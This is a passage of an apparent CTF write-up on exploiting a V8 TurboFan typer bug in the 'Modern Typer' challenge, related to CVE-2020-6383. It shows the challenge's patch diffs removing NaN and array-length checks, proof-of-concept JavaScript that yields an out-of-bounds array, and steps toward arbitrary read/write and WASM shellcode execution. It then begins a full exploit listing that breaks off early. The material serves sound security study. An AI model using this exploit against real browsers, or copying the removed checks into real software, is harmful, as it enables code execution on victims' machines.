+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  // If we do not have enough type information for the initial value or
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  // the increment, just return the initial value&#39;s type.
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  if (initial_type.IsNone() ||
+</span></span></span><span class="line"><span class="cl"><span class="gi">+      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) {
+</span></span></span><span class="line"><span class="cl"><span class="gi">+    return initial_type;
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   }
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="gd">-  // We only handle integer induction variables (otherwise ranges
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  // do not apply and we cannot do anything).
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  if (!both_types_integer || maybe_nan) {
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  // We only handle integer induction variables (otherwise ranges do not apply
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  // and we cannot do anything). Moreover, we don&#39;t support infinities in
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  // {increment_type} because the induction variable can become NaN through
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  // addition/subtraction of opposing infinities.
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
+</span></span></span><span class="line"><span class="cl"><span class="gi">+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
+</span></span></span><span class="line"><span class="cl"><span class="gi">+      increment_type.Min() == -V8_INFINITY ||
+</span></span></span><span class="line"><span class="cl"><span class="gi">+      increment_type.Max() == +V8_INFINITY) {
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     // Fallback to normal phi typing, but ensure monotonicity.
+</span></span><span class="line"><span class="cl">     // (Unfortunately, without baking in the previous type, monotonicity might
+</span></span><span class="line"><span class="cl">     // be violated because we might not yet have retyped the incrementing
+</span></span><span class="line"><span class="cl"><span class="gu">@@ -883,14 +877,13 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     }
+</span></span><span class="line"><span class="cl">     return type;
+</span></span><span class="line"><span class="cl">   }
+</span></span><span class="line"><span class="cl"><span class="gd">-  // If we do not have enough type information for the initial value or
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  // the increment, just return the initial value&#39;s type.
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  if (initial_type.IsNone() ||
+</span></span></span><span class="line"><span class="cl"><span class="gd">-      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) {
+</span></span></span><span class="line"><span class="cl"><span class="gd">-    return initial_type;
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  }
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span> 
+</span></span><span class="line"><span class="cl">   // Now process the bounds.
+</span></span><span class="line"><span class="cl"><span class="gi">+  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  DCHECK(res != induction_vars_-&gt;induction_variables().end());
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  InductionVariable* induction_var = res-&gt;second;
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
+</span></span></span><span class="line"><span class="cl"><span class="gi">+
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   double min = -V8_INFINITY;
+</span></span><span class="line"><span class="cl">   double max = V8_INFINITY;
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="gu">@@ -946,8 +939,8 @@
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     // The lower bound must be at most the initial value&#39;s lower bound.
+</span></span><span class="line"><span class="cl">     min = std::min(min, initial_type.Min());
+</span></span><span class="line"><span class="cl">   } else {
+</span></span><span class="line"><span class="cl"><span class="gd">-    // Shortcut: If the increment can be both positive and negative,
+</span></span></span><span class="line"><span class="cl"><span class="gd">-    // the variable can go arbitrarily far, so just return integer.
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+    // If the increment can be both positive and negative, the variable can go
+</span></span></span><span class="line"><span class="cl"><span class="gi">+    // arbitrarily far.
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     return typer_-&gt;cache_-&gt;kInteger;
+</span></span><span class="line"><span class="cl">   }
+</span></span><span class="line"><span class="cl">   if (FLAG_trace_turbo_loop) {
+</span></span></code></pre></div>
+<h2 id="modern-typer">Modern Typer<a href="#modern-typer" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h2>
+<p>After the analysis of <code>CVE-2020-6383</code>, understanding the exploitation of Modern Typer will be easier as it abuses a similar vulnerability.</p>
+<h3 id="patch-file">Patch File<a href="#patch-file" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
+</span></span></span><span class="line"><span class="cl"><span class="gh">index 619475ef7f..d1cfcae1f4 100644
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/js-create-lowering.cc
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/js-create-lowering.cc
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -699,7 +699,7 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>       int capacity = static_cast&lt;int&gt;(length_type.Max());
+</span></span><span class="line"><span class="cl">       // Replace length with a constant in order to protect against a potential
+</span></span><span class="line"><span class="cl">       // typer bug leading to length &gt; capacity.
+</span></span><span class="line"><span class="cl"><span class="gd">-      length = jsgraph()-&gt;Constant(capacity);
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+      //length = jsgraph()-&gt;Constant(capacity);
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
+</span></span><span class="line"><span class="cl">                             allocation, slack_tracking_prediction);
+</span></span><span class="line"><span class="cl">     }
+</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/operation-typer.cc b/src/compiler/operation-typer.cc
+</span></span></span><span class="line"><span class="cl"><span class="gh">index 8b889c6948..c13d58e4c2 100644
+</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/operation-typer.cc
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/operation-typer.cc
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -325,7 +325,7 @@ Type OperationTyper::NumberAbs(Type type) {
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   DCHECK(type.Is(Type::Number()));
+</span></span><span class="line"><span class="cl">   if (type.IsNone()) return type;
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="gd">-  bool const maybe_nan = type.Maybe(Type::NaN());
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  //bool const maybe_nan = type.Maybe(Type::NaN());
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   bool const maybe_minuszero = type.Maybe(Type::MinusZero());
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">   type = Type::Intersect(type, Type::PlainNumber(), zone());
+</span></span><span class="line"><span class="cl"><span class="gu">@@ -345,9 +345,9 @@ Type OperationTyper::NumberAbs(Type type) {
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   if (maybe_minuszero) {
+</span></span><span class="line"><span class="cl">     type = Type::Union(type, cache_-&gt;kSingletonZero, zone());
+</span></span><span class="line"><span class="cl">   }
+</span></span><span class="line"><span class="cl"><span class="gd">-  if (maybe_nan) {
+</span></span></span><span class="line"><span class="cl"><span class="gd">-    type = Type::Union(type, Type::NaN(), zone());
+</span></span></span><span class="line"><span class="cl"><span class="gd">-  }
+</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  //if (maybe_nan) {
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  //  type = Type::Union(type, Type::NaN(), zone());
+</span></span></span><span class="line"><span class="cl"><span class="gi">+  //}
+</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   return type;
+</span></span><span class="line"><span class="cl"> }
+</span></span></code></pre></div>
+<h2 id="patch-analysis">Patch Analysis<a href="#patch-analysis" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h2>
+<p>If we put close attention to the patches applied for Modern Typer, we can notice that one of the patches applies to <code>JSCreateLowering::ReduceJSCreateArray</code>. This patch ultimately removes the previous patch for <code>CVE-2020-6383</code>, implementing explicit upper bound checks of constructed arrays in order to provide hardening against typer bugs. Based on this patch, we assume to be likely that the vulnerability to exploit this challenge will involve the speculation of a constructed array&rsquo;s upper bounds through a potential type confusion vulnerability.</p>
+<p>If we take a look at the other function in which the provided patch applies, we can see that it involves <code>OperationTyper::NumberAbs</code>. Changes imposed in this function by this patch are rather concise, and consists of removing <code>NaN</code> type checks to the result of <code>NumberAbs</code>.</p>
+<p>Having in mind the extent of the provided patch and the functions involved, we can execute a number of test in order to understand how exploitation can be achieved.</p>
+<p>If we take the previous PoC provided for <code>CVE-2020-6383</code> and try to execute it on a patched v8 build we will see that an OOB array is not achieved. We can inspect Turbofan&rsquo;s optimization phases with <code>Turbolizer</code> in order to gain a better understanding of what is happening.</p>
+<p>We can generate Turbolizer output files if we run the PoC with the following flags:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># setting up turbolizer</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> v8/tools/turbolizer
+</span></span><span class="line"><span class="cl">npm i <span class="o">&amp;&amp;</span> npm run-script build
+</span></span><span class="line"><span class="cl">python3 -m http.server 2<span class="p">&amp;</span>&gt;1 &gt; /dev/null <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> -
+</span></span><span class="line"><span class="cl"><span class="c1"># running poc and provide turbolizer output</span>
+</span></span><span class="line"><span class="cl">v8/out/x64.release/d8 ./poc.js --trace-turbo</span></span></code></pre></div>
+<p>We can observe the following Turbolizer Typer phase graph of our function <code>trigger</code>:</p>
+<p><img src="/2021-12-30-134638_948x785_scrot.png#center" alt=""></p>
+<p>Based on the Turbolizer&rsquo;s output, we can interpret that type inference of our variable <code>i</code> as being interpreted as follows:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(2, 3)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="c1">// Truncate Float64ToWord32 (SimplifiedLowering) i = 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(0, 1) -- reality: i = 0 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(1, 2) -- reality: i = 1              
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
+Based on previous patches applied to <code>CVE-2020-6383</code>, we can notice that after finalizing the for-loop, <code>i</code> has the type of <code>Union(NaN, kInteger)</code>. Since <code>i</code> contains the type <code>NaN</code>, arithmetic operations do not apply.</p>
+<p>We can also observe that the type of <code>i</code> gets converted from a <code>Float64</code> representation to an <code>Int32</code> right before the Shift Arithmetic Right operation in the <code>Simplified Lowering</code> phase, in which coverts the value of <code>NaN</code> to 0:</p>
+<p><img src="/2021-12-30-135147_969x753_scrot.png#center" alt=""></p>
+<p>Moving forward from this point, the type inference of <code>i</code> align with the possible values that <code>i</code> may hold, and the creation of an Array with OOB indexed property access is not achieved.</p>
+<p>However, we may be able to escape <code>NaN</code> typing abusing the <code>NumberAbs</code> function. As we covered previously, the patch for this challenge removes the <code>NaN</code> type check to the return value of <code>NumberAbs</code>, therefore it will effectively escape <code>NaN</code> typing of whatever value we provide as a parameter.</p>
+<p>Lets modify our PoC and apply the following:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>  <span class="c1">// &lt;------ escaping NaN typing
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>If we analyze the Typer phase of this new instance of <code>trigger</code> in Turbolizer we will see the following:</p>
+<p><img src="/2021-12-30-135741_872x715_scrot.png#center" alt=""></p>
+<p>As we can observe, the call to <code>NumberAbs</code> escapes <code>NaN</code> typing. We can also observe based on Turbolizer&rsquo;s <code>Simplified Lowering</code> phase that the value of <code>i</code> changes from <code>NaN</code> to 0 via the <code>ChangeFloat64ToInt32</code> machine level node after the call to <code>NumberAbs</code>, enabling to apply arithmetic operations to the value of <code>i</code> moving forward:</p>
+<p>![](/2021-12-30-140249_924x731_scrot 1.png#center)</p>
+<p>Overall the wrong type inference in this scenario works as follows:</p>
+<p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">	  <span class="c1">// i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="c1">// inference: i = Range(1024, 1025) - reality: i = 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(2, 3) -- reality: i = -1022 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(1, 1) -- reality: i = 1073741313 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
+</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(2, 2) -- reality: i = 1073741314              
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
+After succesfully escaping <code>NaN</code> typing abusing <code>NumberAbs</code>, the vulnerability can be triggered enabling us to create an Array with OOB indexed property access.</p>
+<h3 id="exploitation-1">Exploitation<a href="#exploitation-1" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p>Now that we have OOB access, the exploit strategy is simple. We need an <code>addrof</code> primitive to obtain the address of arbitrary objects, and in this case, we can neglect the creation of a <code>fakeobj</code> primitive in order to create objects at arbitrary memory locations.
+This is due to the fact that since we have a large enough OOB read/write primitive, it can be trivially converted into an arbitrary read/write primitive. In order to achieve successful exploitation we follow the following steps:</p>
+<ol>
+<li>First we allocate two arrays, an unboxed and a boxed array. These arrays should be declared after the OOB array so that they are consecutively allocated in V8&rsquo;s heap with respect to our OOB array, in order to access their contents through our OOB array.</li>
+<li>We leak the map tagged pointers of both the boxed and unboxed array accordingly.</li>
+<li>Leveraging the leaked maps, we construct an <code>addrof</code> primitive enabling type confusion of the unboxed array elements by changing the unboxed array map accordingly.</li>
+<li>Construct arbitrary read/write primitives by overwriting the unboxed array&rsquo;s elements pointer (taking care of V8&rsquo;s pointer compression).</li>
+<li>Instantiate a WASM instance, leak its RWX page and write the contents of arbitrary code to it to then pivot control flow of execution.</li>
+</ol>
+<h3 id="full-exploit">Full Exploit<a href="#full-exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+      stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
+      <line x1="8" y1="12" x2="16" y2="12"></line>
+   </svg></a></h3>
+<p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">	    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> 
